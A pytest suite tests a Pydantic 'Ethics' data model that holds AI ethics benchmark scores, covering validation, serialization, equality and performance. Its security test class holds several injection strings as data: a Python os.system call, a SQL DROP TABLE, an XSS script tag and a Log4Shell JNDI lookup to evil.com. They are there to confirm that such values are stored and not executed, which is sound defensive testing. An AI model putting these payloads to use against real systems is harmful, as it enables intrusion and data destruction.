"""
MIT License
https://mit-license.org/
Copyright © 2025 Infosys Ltd.

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"""

import pytest
import sys
import os
from typing import Dict, Any
from pydantic import ValidationError
import json

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from dao.mappers.ethics import Ethics


# ==================== FIXTURES ====================

@pytest.fixture
def valid_ethics_data():
    """Fixture providing valid ethics data"""
    return {
        "model_name": "gpt-4",
        "social_chemistry_101_acc": "0.85",
        "ehitcs_acc": "0.90",
        "moralchoice_acc": "0.88",
        "moralchoice_rta": "0.92",
        "emotional_acc": "0.87",
        "overall": "0.884",
        "inhouse_model": False
    }


@pytest.fixture
def minimal_ethics_data():
    """Fixture providing minimal required ethics data (without optional fields)"""
    return {
        "model_name": "test-model",
        "social_chemistry_101_acc": "0.75",
        "ehitcs_acc": "0.80",
        "moralchoice_acc": "0.82",
        "moralchoice_rta": "0.85",
        "emotional_acc": "0.78",
        "overall": "0.80"
    }


@pytest.fixture
def ethics_instance(valid_ethics_data):
    """Fixture providing an Ethics instance"""
    return Ethics(**valid_ethics_data)


@pytest.fixture
def numeric_string_data():
    """Fixture with various numeric string formats"""
    return {
        "model_name": "numeric-test",
        "social_chemistry_101_acc": "0.123",
        "ehitcs_acc": "1.0",
        "moralchoice_acc": "0.999",
        "moralchoice_rta": "0.001",
        "emotional_acc": "0.5",
        "overall": "0.5246",
        "inhouse_model": True
    }


# ==================== FUNCTIONAL CORRECTNESS TESTS ====================

class TestEthicsFunctionalCorrectness:
    """Test functional correctness of Ethics model"""
    
    def test_create_ethics_with_all_fields(self, valid_ethics_data):
        """Test creating Ethics instance with all fields"""
        ethics = Ethics(**valid_ethics_data)
        
        assert ethics.model_name == "gpt-4"
        assert ethics.social_chemistry_101_acc == "0.85"
        assert ethics.ehitcs_acc == "0.90"
        assert ethics.moralchoice_acc == "0.88"
        assert ethics.moralchoice_rta == "0.92"
        assert ethics.emotional_acc == "0.87"
        assert ethics.overall == "0.884"
        assert ethics.inhouse_model is False
    
    def test_create_ethics_without_optional_field(self, minimal_ethics_data):
        """Test creating Ethics instance without optional inhouse_model field"""
        ethics = Ethics(**minimal_ethics_data)
        
        assert ethics.model_name == "test-model"
        assert ethics.social_chemistry_101_acc == "0.75"
        assert ethics.inhouse_model is False  # Default value
    
    def test_inhouse_model_default_value(self, minimal_ethics_data):
        """Test that inhouse_model defaults to False when not provided"""
        ethics = Ethics(**minimal_ethics_data)
        
        assert ethics.inhouse_model is False
        assert isinstance(ethics.inhouse_model, bool)
    
    def test_inhouse_model_true(self, valid_ethics_data):
        """Test setting inhouse_model to True"""
        valid_ethics_data["inhouse_model"] = True
        ethics = Ethics(**valid_ethics_data)
        
        assert ethics.inhouse_model is True
    
    def test_all_accuracy_fields_are_strings(self, valid_ethics_data):
        """Test that all accuracy fields are stored as strings"""
        ethics = Ethics(**valid_ethics_data)
        
        assert isinstance(ethics.social_chemistry_101_acc, str)
        assert isinstance(ethics.ehitcs_acc, str)
        assert isinstance(ethics.moralchoice_acc, str)
        assert isinstance(ethics.moralchoice_rta, str)
        assert isinstance(ethics.emotional_acc, str)
        assert isinstance(ethics.overall, str)
    
    def test_model_name_field(self, valid_ethics_data):
        """Test model_name field accepts various string formats"""
        test_names = [
            "gpt-4",
            "claude-3",
            "llama-2-70b",
            "model_with_underscores",
            "MODEL123",
            "model with spaces",
            "模型名称"  # Unicode characters
        ]
        
        for name in test_names:
            valid_ethics_data["model_name"] = name
            ethics = Ethics(**valid_ethics_data)
            assert ethics.model_name == name


# ==================== EDGE CASES TESTS ====================

class TestEthicsEdgeCases:
    """Test edge cases for Ethics model"""
    
    def test_empty_string_accuracy_values(self, valid_ethics_data):
        """Test that empty strings are accepted for accuracy fields"""
        valid_ethics_data["social_chemistry_101_acc"] = ""
        valid_ethics_data["ehitcs_acc"] = ""
        
        ethics = Ethics(**valid_ethics_data)
        
        assert ethics.social_chemistry_101_acc == ""
        assert ethics.ehitcs_acc == ""
    
    def test_very_long_string_accuracy(self, valid_ethics_data):
        """Test handling of very long string values"""
        long_value = "0." + "1234567890" * 100
        valid_ethics_data["overall"] = long_value
        
        ethics = Ethics(**valid_ethics_data)
        
        assert ethics.overall == long_value
    
    def test_special_characters_in_accuracy_strings(self, valid_ethics_data):
        """Test accuracy fields with special characters"""
        special_values = [
            "0.85%",
            "85.5%",
            "N/A",
            "null",
            "undefined",
            "-0.5",
            "+0.95"
        ]
        
        for value in special_values:
            valid_ethics_data["social_chemistry_101_acc"] = value
            ethics = Ethics(**valid_ethics_data)
            assert ethics.social_chemistry_101_acc == value
    
    def test_whitespace_in_strings(self, valid_ethics_data):
        """Test handling of whitespace in string fields"""
        valid_ethics_data["model_name"] = "  model with spaces  "
        valid_ethics_data["overall"] = " 0.85 "
        
        ethics = Ethics(**valid_ethics_data)
        
        # Pydantic doesn't strip by default
        assert ethics.model_name == "  model with spaces  "
        assert ethics.overall == " 0.85 "
    
    def test_numeric_zero_values(self, valid_ethics_data):
        """Test zero values for accuracy fields"""
        valid_ethics_data["social_chemistry_101_acc"] = "0"
        valid_ethics_data["ehitcs_acc"] = "0.0"
        valid_ethics_data["moralchoice_acc"] = "0.00"
        
        ethics = Ethics(**valid_ethics_data)
        
        assert ethics.social_chemistry_101_acc == "0"
        assert ethics.ehitcs_acc == "0.0"
        assert ethics.moralchoice_acc == "0.00"
    
    def test_very_large_accuracy_values(self, valid_ethics_data):
        """Test very large numeric string values"""
        valid_ethics_data["overall"] = "999999.999999"
        
        ethics = Ethics(**valid_ethics_data)
        
        assert ethics.overall == "999999.999999"
    
    def test_negative_accuracy_values(self, valid_ethics_data):
        """Test negative accuracy values"""
        valid_ethics_data["emotional_acc"] = "-0.5"
        valid_ethics_data["overall"] = "-100"
        
        ethics = Ethics(**valid_ethics_data)
        
        assert ethics.emotional_acc == "-0.5"
        assert ethics.overall == "-100"
    
    def test_unicode_characters_in_model_name(self, valid_ethics_data):
        """Test unicode characters in model_name"""
        unicode_names = [
            "模型-GPT-4",
            "Модель-Claude",
            "モデル-Llama",
            "🤖-AI-Model",
            "Model™®©"
        ]
        
        for name in unicode_names:
            valid_ethics_data["model_name"] = name
            ethics = Ethics(**valid_ethics_data)
            assert ethics.model_name == name
    
    def test_single_character_model_name(self, valid_ethics_data):
        """Test single character model name"""
        valid_ethics_data["model_name"] = "A"
        
        ethics = Ethics(**valid_ethics_data)
        
        assert ethics.model_name == "A"
    
    def test_very_long_model_name(self, valid_ethics_data):
        """Test very long model name"""
        long_name = "model_" * 1000
        valid_ethics_data["model_name"] = long_name
        
        ethics = Ethics(**valid_ethics_data)
        
        assert ethics.model_name == long_name
        assert len(ethics.model_name) > 5000


# ==================== ERROR HANDLING & VALIDATION TESTS ====================

class TestEthicsErrorHandling:
    """Test error handling and validation"""
    
    def test_missing_required_model_name(self, valid_ethics_data):
        """Test that missing model_name raises ValidationError"""
        del valid_ethics_data["model_name"]
        
        with pytest.raises(ValidationError) as exc_info:
            Ethics(**valid_ethics_data)
        
        assert "model_name" in str(exc_info.value)
        assert "Field required" in str(exc_info.value)
    
    def test_missing_required_social_chemistry_acc(self, valid_ethics_data):
        """Test that missing social_chemistry_101_acc raises ValidationError"""
        del valid_ethics_data["social_chemistry_101_acc"]
        
        with pytest.raises(ValidationError) as exc_info:
            Ethics(**valid_ethics_data)
        
        assert "social_chemistry_101_acc" in str(exc_info.value)
    
    def test_missing_required_ehitcs_acc(self, valid_ethics_data):
        """Test that missing ehitcs_acc raises ValidationError"""
        del valid_ethics_data["ehitcs_acc"]
        
        with pytest.raises(ValidationError) as exc_info:
            Ethics(**valid_ethics_data)
        
        assert "ehitcs_acc" in str(exc_info.value)
    
    def test_missing_required_moralchoice_acc(self, valid_ethics_data):
        """Test that missing moralchoice_acc raises ValidationError"""
        del valid_ethics_data["moralchoice_acc"]
        
        with pytest.raises(ValidationError) as exc_info:
            Ethics(**valid_ethics_data)
        
        assert "moralchoice_acc" in str(exc_info.value)
    
    def test_missing_required_moralchoice_rta(self, valid_ethics_data):
        """Test that missing moralchoice_rta raises ValidationError"""
        del valid_ethics_data["moralchoice_rta"]
        
        with pytest.raises(ValidationError) as exc_info:
            Ethics(**valid_ethics_data)
        
        assert "moralchoice_rta" in str(exc_info.value)
    
    def test_missing_required_emotional_acc(self, valid_ethics_data):
        """Test that missing emotional_acc raises ValidationError"""
        del valid_ethics_data["emotional_acc"]
        
        with pytest.raises(ValidationError) as exc_info:
            Ethics(**valid_ethics_data)
        
        assert "emotional_acc" in str(exc_info.value)
    
    def test_missing_required_overall(self, valid_ethics_data):
        """Test that missing overall raises ValidationError"""
        del valid_ethics_data["overall"]
        
        with pytest.raises(ValidationError) as exc_info:
            Ethics(**valid_ethics_data)
        
        assert "overall" in str(exc_info.value)
    
    def test_none_value_for_required_field(self, valid_ethics_data):
        """Test that None value for required field raises ValidationError"""
        valid_ethics_data["model_name"] = None
        
        with pytest.raises(ValidationError) as exc_info:
            Ethics(**valid_ethics_data)
        
        assert "model_name" in str(exc_info.value)
    
    def test_none_value_for_accuracy_field(self, valid_ethics_data):
        """Test that None value for accuracy field raises ValidationError"""
        valid_ethics_data["social_chemistry_101_acc"] = None
        
        with pytest.raises(ValidationError) as exc_info:
            Ethics(**valid_ethics_data)
        
        assert "social_chemistry_101_acc" in str(exc_info.value)
    
    def test_invalid_type_for_inhouse_model(self, valid_ethics_data):
        """Test that invalid type for inhouse_model raises ValidationError"""
        # Pydantic v2 is strict with boolean parsing
        valid_ethics_data["inhouse_model"] = "not_a_boolean"
        
        # Pydantic v2 raises ValidationError for invalid boolean strings
        with pytest.raises(ValidationError) as exc_info:
            Ethics(**valid_ethics_data)
        
        assert "inhouse_model" in str(exc_info.value)
        assert "bool_parsing" in str(exc_info.value)
    
    def test_numeric_inhouse_model_values(self, valid_ethics_data):
        """Test numeric values for inhouse_model field"""
        # Test 0 and 1 which are common boolean representations
        valid_ethics_data["inhouse_model"] = 0
        ethics1 = Ethics(**valid_ethics_data)
        assert ethics1.inhouse_model is False
        
        valid_ethics_data["inhouse_model"] = 1
        ethics2 = Ethics(**valid_ethics_data)
        assert ethics2.inhouse_model is True
    
    def test_empty_dict_initialization(self):
        """Test that empty dict raises ValidationError"""
        with pytest.raises(ValidationError) as exc_info:
            Ethics()
        
        errors = str(exc_info.value)
        assert "model_name" in errors
        assert "social_chemistry_101_acc" in errors
    
    def test_extra_fields_handling(self, valid_ethics_data):
        """Test handling of extra fields not in model"""
        valid_ethics_data["extra_field"] = "extra_value"
        valid_ethics_data["another_field"] = 123
        
        # By default, Pydantic ignores extra fields
        ethics = Ethics(**valid_ethics_data)
        
        assert not hasattr(ethics, "extra_field")
        assert not hasattr(ethics, "another_field")


# ==================== SERIALIZATION & DESERIALIZATION TESTS ====================

class TestEthicsSerialization:
    """Test serialization and deserialization"""
    
    def test_model_dump(self, ethics_instance):
        """Test converting Ethics instance to dictionary"""
        data = ethics_instance.model_dump()
        
        assert isinstance(data, dict)
        assert data["model_name"] == "gpt-4"
        assert data["social_chemistry_101_acc"] == "0.85"
        assert data["inhouse_model"] is False
    
    def test_model_dump_json(self, ethics_instance):
        """Test converting Ethics instance to JSON string"""
        json_str = ethics_instance.model_dump_json()
        
        assert isinstance(json_str, str)
        assert "gpt-4" in json_str
        assert "0.85" in json_str
        
        # Verify it's valid JSON
        parsed = json.loads(json_str)
        assert parsed["model_name"] == "gpt-4"
    
    def test_model_dump_exclude_fields(self, ethics_instance):
        """Test excluding fields during serialization"""
        data = ethics_instance.model_dump(exclude={"inhouse_model"})
        
        assert "model_name" in data
        assert "inhouse_model" not in data
    
    def test_model_dump_include_fields(self, ethics_instance):
        """Test including only specific fields during serialization"""
        data = ethics_instance.model_dump(include={"model_name", "overall"})
        
        assert "model_name" in data
        assert "overall" in data
        assert "social_chemistry_101_acc" not in data
    
    def test_json_deserialization(self, valid_ethics_data):
        """Test creating Ethics from JSON string"""
        json_str = json.dumps(valid_ethics_data)
        ethics = Ethics.model_validate_json(json_str)
        
        assert ethics.model_name == valid_ethics_data["model_name"]
        assert ethics.overall == valid_ethics_data["overall"]
    
    def test_dict_deserialization(self, valid_ethics_data):
        """Test creating Ethics from dictionary"""
        ethics = Ethics.model_validate(valid_ethics_data)
        
        assert ethics.model_name == valid_ethics_data["model_name"]
        assert ethics.social_chemistry_101_acc == valid_ethics_data["social_chemistry_101_acc"]
    
    def test_roundtrip_serialization(self, ethics_instance):
        """Test that serialization and deserialization preserve data"""
        # Serialize to dict
        data = ethics_instance.model_dump()
        
        # Deserialize back
        ethics_copy = Ethics(**data)
        
        # Compare all fields
        assert ethics_copy.model_name == ethics_instance.model_name
        assert ethics_copy.social_chemistry_101_acc == ethics_instance.social_chemistry_101_acc
        assert ethics_copy.ehitcs_acc == ethics_instance.ehitcs_acc
        assert ethics_copy.moralchoice_acc == ethics_instance.moralchoice_acc
        assert ethics_copy.moralchoice_rta == ethics_instance.moralchoice_rta
        assert ethics_copy.emotional_acc == ethics_instance.emotional_acc
        assert ethics_copy.overall == ethics_instance.overall
        assert ethics_copy.inhouse_model == ethics_instance.inhouse_model
    
    def test_json_roundtrip(self, ethics_instance):
        """Test JSON serialization and deserialization roundtrip"""
        json_str = ethics_instance.model_dump_json()
        ethics_copy = Ethics.model_validate_json(json_str)
        
        assert ethics_copy.model_name == ethics_instance.model_name
        assert ethics_copy.overall == ethics_instance.overall


# ==================== EQUALITY & COMPARISON TESTS ====================

class TestEthicsEquality:
    """Test equality and comparison operations"""
    
    def test_equality_same_values(self, valid_ethics_data):
        """Test that two Ethics instances with same values are equal"""
        ethics1 = Ethics(**valid_ethics_data)
        ethics2 = Ethics(**valid_ethics_data)
        
        assert ethics1 == ethics2
    
    def test_inequality_different_model_name(self, valid_ethics_data):
        """Test that Ethics instances with different model_name are not equal"""
        ethics1 = Ethics(**valid_ethics_data)
        
        valid_ethics_data["model_name"] = "different-model"
        ethics2 = Ethics(**valid_ethics_data)
        
        assert ethics1 != ethics2
    
    def test_inequality_different_accuracy(self, valid_ethics_data):
        """Test that Ethics instances with different accuracy are not equal"""
        ethics1 = Ethics(**valid_ethics_data)
        
        valid_ethics_data["overall"] = "0.99"
        ethics2 = Ethics(**valid_ethics_data)
        
        assert ethics1 != ethics2
    
    def test_inequality_different_inhouse_model(self, valid_ethics_data):
        """Test that Ethics instances with different inhouse_model are not equal"""
        valid_ethics_data["inhouse_model"] = False
        ethics1 = Ethics(**valid_ethics_data)
        
        valid_ethics_data["inhouse_model"] = True
        ethics2 = Ethics(**valid_ethics_data)
        
        assert ethics1 != ethics2


# ==================== IMMUTABILITY & STATE TESTS ====================

class TestEthicsImmutability:
    """Test immutability and state management"""
    
    def test_field_modification(self, ethics_instance):
        """Test that fields can be modified (Pydantic models are mutable by default)"""
        original_name = ethics_instance.model_name
        ethics_instance.model_name = "new-model"
        
        assert ethics_instance.model_name == "new-model"
        assert ethics_instance.model_name != original_name
    
    def test_field_reassignment_maintains_type(self, ethics_instance):
        """Test that field reassignment maintains correct type"""
        ethics_instance.overall = "0.95"
        
        assert isinstance(ethics_instance.overall, str)
        assert ethics_instance.overall == "0.95"
    
    def test_inhouse_model_toggle(self, ethics_instance):
        """Test toggling inhouse_model field"""
        original_value = ethics_instance.inhouse_model
        ethics_instance.inhouse_model = not original_value
        
        assert ethics_instance.inhouse_model != original_value


# ==================== PERFORMANCE TESTS ====================

class TestEthicsPerformance:
    """Test performance characteristics"""
    
    def test_instantiation_performance(self, valid_ethics_data):
        """Test that Ethics instantiation is fast"""
        import time
        
        start_time = time.time()
        for _ in range(1000):
            Ethics(**valid_ethics_data)
        end_time = time.time()
        
        # 1000 instantiations should complete quickly
        assert (end_time - start_time) < 1.0
    
    def test_serialization_performance(self, ethics_instance):
        """Test that serialization is fast"""
        import time
        
        start_time = time.time()
        for _ in range(1000):
            ethics_instance.model_dump()
        end_time = time.time()
        
        # 1000 serializations should complete quickly
        assert (end_time - start_time) < 0.5
    
    def test_validation_performance(self, valid_ethics_data):
        """Test that validation is fast"""
        import time
        
        start_time = time.time()
        for _ in range(1000):
            Ethics.model_validate(valid_ethics_data)
        end_time = time.time()
        
        # 1000 validations should complete quickly
        assert (end_time - start_time) < 1.0


# ==================== CODE QUALITY & STRUCTURE TESTS ====================

class TestEthicsCodeQuality:
    """Test code quality and structure"""
    
    def test_ethics_is_pydantic_basemodel(self):
        """Test that Ethics inherits from BaseModel"""
        from pydantic import BaseModel
        assert issubclass(Ethics, BaseModel)
    
    def test_all_required_fields_present(self):
        """Test that all expected fields are defined"""
        fields = Ethics.model_fields
        
        assert "model_name" in fields
        assert "social_chemistry_101_acc" in fields
        assert "ehitcs_acc" in fields
        assert "moralchoice_acc" in fields
        assert "moralchoice_rta" in fields
        assert "emotional_acc" in fields
        assert "overall" in fields
        assert "inhouse_model" in fields
    
    def test_field_types(self):
        """Test that fields have correct type annotations"""
        fields = Ethics.model_fields
        
        # Check string fields
        assert fields["model_name"].annotation == str
        assert fields["social_chemistry_101_acc"].annotation == str
        assert fields["ehitcs_acc"].annotation == str
        assert fields["moralchoice_acc"].annotation == str
        assert fields["moralchoice_rta"].annotation == str
        assert fields["emotional_acc"].annotation == str
        assert fields["overall"].annotation == str
    
    def test_inhouse_model_is_optional(self):
        """Test that inhouse_model has default value"""
        fields = Ethics.model_fields
        assert fields["inhouse_model"].default == False
    
    def test_ethics_has_string_representation(self, ethics_instance):
        """Test that Ethics instance has string representation"""
        str_repr = str(ethics_instance)
        
        assert isinstance(str_repr, str)
        assert len(str_repr) > 0
    
    def test_ethics_has_repr(self, ethics_instance):
        """Test that Ethics instance has repr"""
        repr_str = repr(ethics_instance)
        
        assert isinstance(repr_str, str)
        assert "Ethics" in repr_str


# ==================== PARAMETRIZED TESTS ====================

class TestEthicsParametrized:
    """Parametrized tests for comprehensive coverage"""
    
    @pytest.mark.parametrize("field_name,field_value", [
        ("social_chemistry_101_acc", "0.1"),
        ("social_chemistry_101_acc", "0.999999"),
        ("ehitcs_acc", "0.0"),
        ("ehitcs_acc", "1.0"),
        ("moralchoice_acc", "0.5"),
        ("moralchoice_rta", "0.75"),
        ("emotional_acc", "0.25"),
        ("overall", "0.888"),
    ])
    def test_various_accuracy_values(self, valid_ethics_data, field_name, field_value):
        """Test various accuracy values for different fields"""
        valid_ethics_data[field_name] = field_value
        ethics = Ethics(**valid_ethics_data)
        
        assert getattr(ethics, field_name) == field_value
    
    @pytest.mark.parametrize("model_name", [
        "gpt-3.5-turbo",
        "gpt-4",
        "claude-2",
        "claude-3-opus",
        "llama-2-7b",
        "llama-2-70b",
        "mistral-7b",
        "mixtral-8x7b",
        "palm-2",
        "gemini-pro",
    ])
    def test_various_model_names(self, valid_ethics_data, model_name):
        """Test various common model names"""
        valid_ethics_data["model_name"] = model_name
        ethics = Ethics(**valid_ethics_data)
        
        assert ethics.model_name == model_name
    
    @pytest.mark.parametrize("inhouse_value,expected", [
        (True, True),
        (False, False),
        (1, True),
        (0, False),
        ("true", True),
        ("false", False),  # Pydantic v2 parses "false" as False
    ])
    def test_various_inhouse_model_values(self, valid_ethics_data, inhouse_value, expected):
        """Test various inhouse_model values and their coercion"""
        valid_ethics_data["inhouse_model"] = inhouse_value
        ethics = Ethics(**valid_ethics_data)
        
        assert ethics.inhouse_model == expected
    
    def test_empty_string_inhouse_model_raises_error(self, valid_ethics_data):
        """Test that empty string for inhouse_model raises ValidationError in Pydantic v2"""
        valid_ethics_data["inhouse_model"] = ""
        
        with pytest.raises(ValidationError) as exc_info:
            Ethics(**valid_ethics_data)
        
        assert "inhouse_model" in str(exc_info.value)
    
    @pytest.mark.parametrize("missing_field", [
        "model_name",
        "social_chemistry_101_acc",
        "ehitcs_acc",
        "moralchoice_acc",
        "moralchoice_rta",
        "emotional_acc",
        "overall",
    ])
    def test_missing_required_fields(self, valid_ethics_data, missing_field):
        """Test that missing any required field raises ValidationError"""
        del valid_ethics_data[missing_field]
        
        with pytest.raises(ValidationError) as exc_info:
            Ethics(**valid_ethics_data)
        
        assert missing_field in str(exc_info.value)


# ==================== INTEGRATION TESTS ====================

class TestEthicsIntegration:
    """Test integration with external systems"""
    
    def test_json_compatibility(self, ethics_instance):
        """Test that Ethics can be serialized to standard JSON"""
        json_str = ethics_instance.model_dump_json()
        
        # Should be parseable by standard json module
        data = json.loads(json_str)
        assert isinstance(data, dict)
        assert data["model_name"] == ethics_instance.model_name
    
    def test_dict_compatibility(self, ethics_instance):
        """Test that Ethics works with dict operations"""
        data = ethics_instance.model_dump()
        
        # Should support dict operations
        assert "model_name" in data
        assert list(data.keys())
        assert list(data.values())
    
    def test_database_ready_format(self, ethics_instance):
        """Test that Ethics output is ready for database storage"""
        data = ethics_instance.model_dump()
        
        # All values should be JSON-serializable types
        json_str = json.dumps(data)
        assert isinstance(json_str, str)
        
        # Should be able to parse back
        parsed = json.loads(json_str)
        assert parsed == data


# ==================== REGRESSION TESTS ====================

class TestEthicsRegression:
    """Test for regression and backward compatibility"""
    
    def test_typo_in_ehitcs_acc_field_name(self, valid_ethics_data):
        """Test that the typo 'ehitcs_acc' (instead of 'ethics_acc') is preserved"""
        # This tests that the field name with typo is maintained
        ethics = Ethics(**valid_ethics_data)
        
        assert hasattr(ethics, "ehitcs_acc")
        assert ethics.ehitcs_acc == "0.90"
    
    def test_backwards_compatible_with_old_data(self):
        """Test that model works with legacy data format"""
        legacy_data = {
            "model_name": "legacy-model",
            "social_chemistry_101_acc": "0.8",
            "ehitcs_acc": "0.85",
            "moralchoice_acc": "0.82",
            "moralchoice_rta": "0.88",
            "emotional_acc": "0.81",
            "overall": "0.832"
            # No inhouse_model field
        }
        
        ethics = Ethics(**legacy_data)
        
        assert ethics.model_name == "legacy-model"
        assert ethics.inhouse_model is False


# ==================== SECURITY TESTS ====================

class TestEthicsSecurity:
    """Test security aspects"""
    
    def test_no_code_injection_in_model_name(self, valid_ethics_data):
        """Test that model_name with code-like strings is treated as string"""
        malicious_names = [
            "__import__('os').system('ls')",
            "'; DROP TABLE ethics; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
        ]
        
        for name in malicious_names:
            valid_ethics_data["model_name"] = name
            ethics = Ethics(**valid_ethics_data)
            # Should just store as string, not execute
            assert ethics.model_name == name
            assert isinstance(ethics.model_name, str)
    
    def test_no_code_injection_in_accuracy_fields(self, valid_ethics_data):
        """Test that accuracy fields with malicious strings are treated as strings"""
        valid_ethics_data["overall"] = "exec('malicious code')"
        
        ethics = Ethics(**valid_ethics_data)
        
        # Should just store as string, not execute
        assert ethics.overall == "exec('malicious code')"
        assert isinstance(ethics.overall, str)


# ==================== SCALABILITY TESTS ====================

class TestEthicsScalability:
    """Test scalability aspects"""
    
    def test_handle_multiple_instances(self, valid_ethics_data):
        """Test creating multiple Ethics instances"""
        instances = []
        
        for i in range(100):
            data = valid_ethics_data.copy()
            data["model_name"] = f"model-{i}"
            instances.append(Ethics(**data))
        
        assert len(instances) == 100
        assert instances[0].model_name == "model-0"
        assert instances[99].model_name == "model-99"
    
    def test_memory_efficiency_with_many_instances(self, valid_ethics_data):
        """Test memory efficiency with many instances"""
        import sys
        
        instances = []
        for i in range(1000):
            data = valid_ethics_data.copy()
            data["model_name"] = f"model-{i}"
            instances.append(Ethics(**data))
        
        # All instances should be created successfully
        assert len(instances) == 1000


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])
